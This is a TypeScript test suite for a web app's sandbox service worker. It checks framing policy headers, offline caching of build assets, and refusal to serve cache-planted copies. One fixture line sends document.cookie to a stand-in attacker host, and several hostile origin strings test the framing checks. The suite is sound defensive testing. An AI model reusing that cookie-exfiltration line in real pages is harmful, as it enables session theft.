import { describe, expect, it } from "vitest";
import {
  FILES_CACHE,
  HOST,
  ORIGIN,
  SCOPE,
  SandboxWorker,
} from "./worker-harness";

const LESSON = "/views/assets/lesson-a.js";
const PRACTICE = "/views/assets/practice-a.js";
const FONT = "/views/assets/inter-a.woff2";
const BUILD = { [LESSON]: "lesson", [PRACTICE]: "practice", [FONT]: "font" };
const PROXY = SCOPE;
const FRAME = `${SCOPE}frame`;
const EARLIER_BUILD = "graspy-view-files:/ui-sandbox/fedcba9876543210/";
const PLANTED = "fetch('https://evil.example/' + document.cookie)";
const FULL = new DOMException(
  "The quota has been exceeded.",
  "QuotaExceededError",
);

const at = (path: string) => `${ORIGIN}${path}`;
const framed = (path: string, host = HOST) =>
  at(`${path}?host=${encodeURIComponent(host)}`);
const fetchesOf = (worker: SandboxWorker, path: string) =>
  worker.fetched.filter((address) => address === at(path)).length;

describe("the sandbox's pages", () => {
  it.each([
    [PROXY, "proxy page", `frame-ancestors ${HOST}`],
    [FRAME, "frame page", `frame-ancestors 'self' ${HOST}`],
  ])(
    "builds %s itself, with no connection and nothing cached",
    async (path, body, policy) => {
      const worker = new SandboxWorker(BUILD);
      worker.online = false;

      const response = await worker.request(framed(path));

      expect(await response?.text()).toBe(body);
      expect(response?.headers.get("content-security-policy")).toBe(policy);
      expect(response?.headers.get("content-type")).toBe(
        "text/html; charset=utf-8",
      );
    },
  );

  it.each([PROXY, FRAME])(
    "never answers %s with a copy a view planted in a cache",
    async (path) => {
      const worker = new SandboxWorker(BUILD);
      for (const name of [FILES_CACHE, "graspy-sandbox-pages-v1"])
        await worker.plant(name, framed(path), PLANTED);

      const response = await worker.request(framed(path));

      expect(await response?.text()).not.toBe(PLANTED);
      expect(response?.headers.get("content-security-policy")).toContain(HOST);
      expect(worker.fetched).toEqual([]);
    },
  );

  it("leaves another build's sandbox to the worker that build registered", async () => {
    const worker = new SandboxWorker(BUILD);

    expect(
      await worker.request(framed("/ui-sandbox/fedcba9876543210/")),
    ).toBeUndefined();
  });

  it.each([HOST, "https://a1b2c3d4.graspy.pages.dev"])(
    "lets %s frame the sandbox",
    async (host) => {
      const worker = new SandboxWorker(BUILD);

      const response = await worker.request(framed(PROXY, host));

      expect(response?.status).toBe(200);
    },
  );

  it.each([
    "https://evil.example",
    ORIGIN,
    "https://a.b.graspy.pages.dev",
    "https://.graspy.pages.dev",
    `${HOST}/`,
    `${HOST} https://evil.example`,
    "https://evil.example?https://graspy.test",
    "",
  ])("lets no page be framed by %j", async (host) => {
    const worker = new SandboxWorker(BUILD);

    for (const path of [PROXY, FRAME]) {
      const response = await worker.request(framed(path, host));
      expect(response?.status).toBe(400);
      expect(response?.headers.get("content-security-policy")).toBeNull();
    }
  });
});

describe("the build's files", () => {
  it("are all kept once a sandbox asks, and it says so", async () => {
    const worker = new SandboxWorker(BUILD);

    const answers = await worker.keep();

    expect(answers).toEqual([{ kept: true }]);
    expect(worker.files().sort()).toEqual(Object.keys(BUILD).sort());
  });

  it("open a view never shown when there is no connection", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.keep();
    worker.online = false;

    const response = await worker.request(at(PRACTICE));

    expect(await response?.text()).toBe("practice");
  });

  it("are said not kept while one could not be", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.network.delete(at(FONT));

    expect(await worker.keep()).toEqual([{ kept: false }]);
    expect(worker.files()).not.toContain(FONT);

    worker.serve(FONT, "font");
    expect(await worker.keep()).toEqual([{ kept: true }]);
    expect(worker.files()).toContain(FONT);
  });

  it("are said not kept when storing them fails", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.cache(FILES_CACHE).refusal = FULL;

    expect(await worker.keep()).toEqual([{ kept: false }]);
  });

  it("are said not kept without a connection, when none is cached", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.online = false;

    expect(await worker.keep()).toEqual([{ kept: false }]);
  });

  it("are kept again in place of a planted copy", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.keep();
    await worker.plant(FILES_CACHE, LESSON, PLANTED);

    expect(await worker.keep()).toEqual([{ kept: true }]);
    expect(await (await worker.cache(FILES_CACHE).match(LESSON))?.text()).toBe(
      "lesson",
    );
  });

  it("serve the network's file, and keep it, in place of a planted copy", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.keep();
    await worker.plant(FILES_CACHE, PRACTICE, PLANTED);

    const response = await worker.request(at(PRACTICE));

    expect(await response?.text()).toBe("practice");
    expect(
      await (await worker.cache(FILES_CACHE).match(PRACTICE))?.text(),
    ).toBe("practice");
  });

  it("fail without a connection rather than serve a planted copy", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.plant(FILES_CACHE, PRACTICE, PLANTED);
    worker.online = false;

    await expect(worker.request(at(PRACTICE))).rejects.toThrow();
    expect(worker.files()).not.toContain(PRACTICE);
  });

  it("leave a file not in the build to the network, planted or not", async () => {
    const worker = new SandboxWorker(BUILD);
    const past = "/views/assets/lesson-old.js";
    await worker.plant(FILES_CACHE, past, PLANTED);

    expect(await worker.request(at(past))).toBeUndefined();
  });

  it("keep no file the network gave with another digest", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.serve(LESSON, "lesson of another build");

    const response = await worker.request(at(LESSON));
    const answers = await worker.keep();

    expect(await response?.text()).toBe("lesson of another build");
    expect(answers).toEqual([{ kept: false }]);
    expect(worker.files()).not.toContain(LESSON);
  });

  it("keep one served from the network, so it opens offline", async () => {
    const worker = new SandboxWorker(BUILD);

    await worker.request(at(LESSON));
    worker.online = false;

    expect(await (await worker.request(at(LESSON)))?.text()).toBe("lesson");
  });

  it("drop whatever else the build's cache holds", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.plant(FILES_CACHE, "/views/assets/lesson-old.js", "old");
    await worker.plant(FILES_CACHE, `${FRAME}?host=x`, PLANTED);

    await worker.keep();

    expect(worker.files().sort()).toEqual(Object.keys(BUILD).sort());
  });

  it("leave an earlier build's cache to that build's worker as it takes over", async () => {
    const worker = new SandboxWorker(BUILD);
    await worker.plant(EARLIER_BUILD, "/views/assets/lesson-old.js", "old");
    await worker.keep();

    await worker.activate();

    expect([...worker.caches.keys()].sort()).toEqual(
      [EARLIER_BUILD, FILES_CACHE].sort(),
    );
  });

  it("are fetched only when lacking, once however many sandboxes ask", async () => {
    const worker = new SandboxWorker(BUILD);

    const answers = await Promise.all([worker.keep(), worker.keep()]);
    await worker.keep();

    expect(answers).toEqual([[{ kept: true }], [{ kept: true }]]);
    for (const path of Object.keys(BUILD))
      expect(fetchesOf(worker, path)).toBe(1);
  });

  it("answer from the network though storing the file fails", async () => {
    const worker = new SandboxWorker(BUILD);
    worker.cache(FILES_CACHE).refusal = FULL;

    const response = await worker.request(at(LESSON));

    expect(await response?.text()).toBe("lesson");
  });
});

describe("a message", () => {
  it("that is not a keep with a port to answer on is ignored", async () => {
    const worker = new SandboxWorker(BUILD);

    await worker.dispatch("message", { data: { type: "keep" }, ports: [] });
    await worker.dispatch("message", { data: { type: "precache" } });

    expect(worker.fetched).toEqual([]);
  });
});
